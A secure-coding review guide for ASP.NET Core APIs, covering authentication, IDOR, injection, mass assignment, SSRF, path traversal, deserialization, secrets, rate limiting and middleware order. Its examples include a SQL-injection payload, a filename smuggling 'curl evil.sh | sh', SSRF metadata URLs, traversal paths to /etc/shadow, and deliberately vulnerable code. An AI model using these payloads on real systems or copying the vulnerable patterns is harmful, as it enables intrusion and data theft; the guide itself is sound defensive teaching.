# ASP.NET Core backend security — rules in depth

Each section: the exploit, the vulnerable pattern, the fix, and the
false-positive caveat. Examples target .NET 9 with Npgsql/EF Core and a
JWT-authenticated multi-role API (SuperAdmin/Admin/User).

---

## §authn — Authentication coverage

**Exploit.** A controller added in a hurry has no `[Authorize]`; the
endpoint is anonymous in production. Nobody notices because the Admin UI
always sends a token anyway.

**Vulnerable:**

```csharp
[ApiController]
[Route("api/system-status")]
public class SystemStatusController : ControllerBase // no [Authorize]
```

**Fix — deny by default, opt out explicitly:**

```csharp
builder.Services.AddAuthorization(options =>
{
    options.FallbackPolicy = new AuthorizationPolicyBuilder()
        .RequireAuthenticatedUser()
        .Build();
});
```

With a fallback policy, unattributed endpoints require auth
automatically and `[AllowAnonymous]` becomes a visible, greppable
decision. Review every `[AllowAnonymous]` in the diff: login, health
checks, and the public stream endpoint are legitimate; anything else
needs a stated reason.

**Caveat.** Health-check and metrics endpoints often must be anonymous
for orchestration — confirm they leak no internals (versions, hostnames,
connection info) before passing them.

---

## §authz — Authorization, roles, and IDOR

**Exploit.** `GET /api/stations/12/analytics` checks the JWT is valid
but never that user 7 may see station 12. Increment the ID, read every
tenant's data. Or: the role check is `[Authorize]` instead of
`[Authorize(Roles = "Admin")]` and a plain User calls admin endpoints.

**Vulnerable:**

```csharp
[HttpGet("{id}")]
public async Task<IActionResult> Get(int id) =>
    Ok(await db.Stations.FindAsync(id)); // any authenticated user, any station
```

**Fix — scope every query to the principal:**

```csharp
[HttpGet("{id}")]
public async Task<IActionResult> Get(int id, CancellationToken ct)
{
    var userId = User.GetUserId();
    var station = await db.Stations
        .FirstOrDefaultAsync(s => s.Id == id && s.OwnerId == userId, ct);
    return station is null ? NotFound() : Ok(station); // 404, don't confirm existence
}
```

Role hierarchy rules:
- Encode role checks as **policies** (`options.AddPolicy("AdminOnly",
  p => p.RequireRole("Admin", "SuperAdmin"))`) so "Admin implies
  lower-role access" is written once, not re-derived per endpoint.
- Privilege escalation review: every endpoint that *writes* a role or
  permission field must require a role strictly above the one being
  granted. A User who can PATCH their own `role` field is Critical (see
  §mass-assignment).
- SuperAdmin-only operations (user management, system config) get their
  own policy; grep that every such endpoint carries it.

**Caveat.** Resources that are genuinely global/shared (public station
metadata) don't need ownership scoping — but say so in the review rather
than assuming.

---

## §injection — SQL and command injection

**SQL — exploit.** A search endpoint concatenates the term into SQL;
`'; DROP TABLE play_history; --` or, more realistically, a UNION SELECT
over the users table.

**Vulnerable:**

```csharp
var rows = db.Tracks.FromSqlRaw(
    $"SELECT * FROM tracks WHERE title ILIKE '%{search}%'");
```

**Fix:** LINQ (`db.Tracks.Where(t => EF.Functions.ILike(t.Title, pattern))`),
or `FromSqlInterpolated($"... ILIKE {pattern}")` (interpolation becomes
parameters), or explicit `NpgsqlParameter`s. String concatenation into
SQL is a finding regardless of "it's only called internally".

**Command — exploit.** Audio pipelines shell out (ffmpeg, sox). A track
filename of `"; curl evil.sh | sh; ".mp3` executes in the shell.

**Vulnerable:**

```csharp
Process.Start("/bin/sh", $"-c \"ffmpeg -i '{path}' -f mp3 -\"");
```

**Fix:**

```csharp
var psi = new ProcessStartInfo("ffmpeg")
{
    UseShellExecute = false,
    RedirectStandardOutput = true,
};
psi.ArgumentList.Add("-i");
psi.ArgumentList.Add(path);   // passed as one argv entry, never parsed by a shell
psi.ArgumentList.Add("-f");
psi.ArgumentList.Add("mp3");
psi.ArgumentList.Add("-");
```

`ArgumentList` + `UseShellExecute = false` closes injection by
structure. Also validate `path` against the media root first (§files) —
argument injection (`-i /etc/passwd`) is a separate hole from shell
injection.

---

## §mass-assignment — Model binding over-posting

**Exploit.** The update endpoint binds the request body to the EF
entity. The client adds `"role": "SuperAdmin"` or `"ownerId": 1` to the
JSON; binding sets it; `SaveChanges` persists it.

**Vulnerable:**

```csharp
[HttpPatch("{id}")]
public async Task<IActionResult> Update(int id, [FromBody] User user) // EF entity!
```

**Fix — DTO per operation, map explicitly:**

```csharp
public sealed record UpdateProfileRequest(string DisplayName, string Email);

[HttpPatch("{id}")]
public async Task<IActionResult> Update(int id, UpdateProfileRequest request, CancellationToken ct)
{
    var user = await GetOwnedUserAsync(id, ct); // authz first (§authz)
    user.DisplayName = request.DisplayName;
    user.Email = request.Email;                 // role is unreachable from here
    await db.SaveChangesAsync(ct);
    return NoContent();
}
```

Greppable signals: `[FromBody]` parameters whose type lives in the
Data/entity namespace; `TryUpdateModelAsync` on an entity;
`JsonSerializer.Deserialize<TEntity>`.

**Caveat.** A record DTO with only safe fields bound straight onto the
entity is fine — the issue is *which fields are settable from the
request*, not mapping style.

---

## §ssrf — Server-side request forgery

**Exploit.** The system fetches a stream relay/webhook/artwork URL
stored in configuration. An Admin (or a lower role with config-write
access — check!) sets it to
`http://169.254.169.254/latest/meta-data/` or
`http://postgres:5432/`, and the server happily connects from inside
the Docker network.

**Fix:**
- Allowlist scheme (`https`, plus `http` only for explicitly internal
  targets) and host where the feature permits it.
- Resolve DNS and reject private, loopback, and link-local ranges
  (10/8, 172.16/12, 192.168/16, 127/8, 169.254/16, ::1, fc00::/7)
  *at connect time* (DNS rebinding re-resolves between check and use —
  use a `SocketsHttpHandler.ConnectCallback` that validates the resolved
  IP).
- `AllowAutoRedirect = false`, or re-validate each hop.
- Audit *who can write* the config: SSRF severity is set by the lowest
  role that can edit the URL.

---

## §files — Uploads, downloads, path traversal

**Exploit.** `GET /api/music/files?name=../../../../etc/shadow` or an
upload named `..\..\appsettings.json`. With the media library on a
network mount, traversal reads/writes *the NAS*, not just the container.

**Fix — canonicalize and jail every request-derived path:**

```csharp
var root = Path.GetFullPath(options.MediaRoot);
var candidate = Path.GetFullPath(Path.Combine(root, requestedName));
if (!candidate.StartsWith(root + Path.DirectorySeparatorChar, StringComparison.Ordinal))
{
    return BadRequest(); // traversal attempt — log it with the raw input
}
```

Uploads additionally:
- Regenerate the stored filename server-side (GUID + validated
  extension); keep the original name only as display metadata.
- Validate content type by sniffing magic bytes for audio formats, not
  by trusting `Content-Type` or the extension.
- Enforce size limits (`RequestSizeLimit`, Kestrel
  `MaxRequestBodySize`) — a 24/7 service filling its own media volume is
  a self-DoS.
- Never serve uploaded content with a sniffable content type; set
  `X-Content-Type-Options: nosniff` (templates/security-headers.md).

Linux note: paths are case-sensitive and `\` is a legal filename
character — do the jail check with ordinal comparison and forward
slashes, and don't "normalize" backslashes into separators.

---

## §deserialization — Unsafe deserialization

**Exploit.** `BinaryFormatter` or Newtonsoft with
`TypeNameHandling.Auto/All` lets the payload choose the CLR type to
instantiate — known RCE gadget chains.

**Rules:**
- `BinaryFormatter` is banned (and throws on .NET 9 by default — don't
  re-enable it).
- Newtonsoft: `TypeNameHandling.None` (the default). Any other value on
  untrusted data is a finding.
- `System.Text.Json` has no type-name handling and is the default
  choice. Polymorphic deserialization uses `[JsonDerivedType]`
  allowlists only.
- Don't deserialize directly into domain entities (§mass-assignment).

---

## §secrets — Secrets and configuration

**Exploit.** `appsettings.json` in the repo holds the production
PostgreSQL password or JWT signing key. Anyone with repo read (or an
image pull) owns the database.

**Rules:**
- Real credentials live in environment variables, mounted secret files,
  or user-secrets (dev). `appsettings.json` holds shape and defaults
  only — placeholder values, not real ones.
- Database-backed configuration: secrets stored in a config *table* are
  visible to anyone with DB read and to the config admin UI — decide
  deliberately which settings are secret-class and keep those out of
  the general config store (or encrypted with a key the DB doesn't
  hold).
- Docker: secrets via env/compose secrets, never `ENV` in the
  Dockerfile (baked into layers) and never in the image at all if
  avoidable.
- Grep the diff for: `Password=`, `Pwd=`, `ApiKey`, `SigningKey`,
  `client_secret`, PEM headers. Anything real that ever shipped is
  rotated, not deleted.

---

## §abuse — Rate limiting, brute force, enumeration

**Exploit.** `/api/auth/login` accepts unlimited attempts; credential
stuffing walks a leaked password list. Registration/forgot-password
responses reveal which emails exist.

**Fix:**
- .NET rate limiting middleware on auth endpoints: fixed-window or
  sliding per IP+username, e.g.
  `AddRateLimiter(o => o.AddSlidingWindowLimiter("auth", ...))` and
  `.RequireRateLimiting("auth")` on the login route group.
- Uniform responses: "invalid credentials" for both bad-user and
  bad-password; same status and timing shape for forgot-password
  regardless of account existence.
- Lockout/backoff via Identity options where Identity is in use.
- For the public stream endpoints, abuse is a capacity question —
  connection limits per IP at the proxy, not in app code.

---

## §middleware-order — Pipeline ordering traps

Middleware runs in registration order; ordering bugs are silent
security bugs.

The canonical order:

```csharp
app.UseForwardedHeaders();   // first, if behind a proxy — else scheme/IP are wrong
app.UseExceptionHandler(...);// before anything that can throw
app.UseHsts();
app.UseHttpsRedirection();
app.UseRouting();
app.UseCors("AdminUi");      // after routing, before auth
app.UseRateLimiter();
app.UseAuthentication();     // WHO
app.UseAuthorization();      // MAY THEY — must follow UseAuthentication
app.MapControllers();
```

Traps:
- `UseAuthorization` before `UseAuthentication` → policies evaluate an
  anonymous principal.
- CORS registered after auth → preflights fail or, worse, errors bypass
  the policy.
- Custom middleware that short-circuits (`await next()` skipped on some
  path) before auth runs → that path is anonymous.
- `UseForwardedHeaders` missing behind nginx/traefik → rate limiting
  keys on the proxy IP and `RequireHttps` loops.

---

## §errors — Error handling and information disclosure

- `app.UseExceptionHandler` → generic `ProblemDetails` in
  non-Development. `UseDeveloperExceptionPage` only inside
  `if (env.IsDevelopment())`.
- EF/Npgsql exceptions must not reach the response: they contain table
  names, constraint names, sometimes data values.
- Log the rich context server-side with the correlation ID; return the
  correlation ID (only) to the client so support can match them up.
- 404 vs 403: for resources the caller doesn't own, prefer 404 (don't
  confirm existence) — consistently, or the inconsistency is itself an
  oracle.
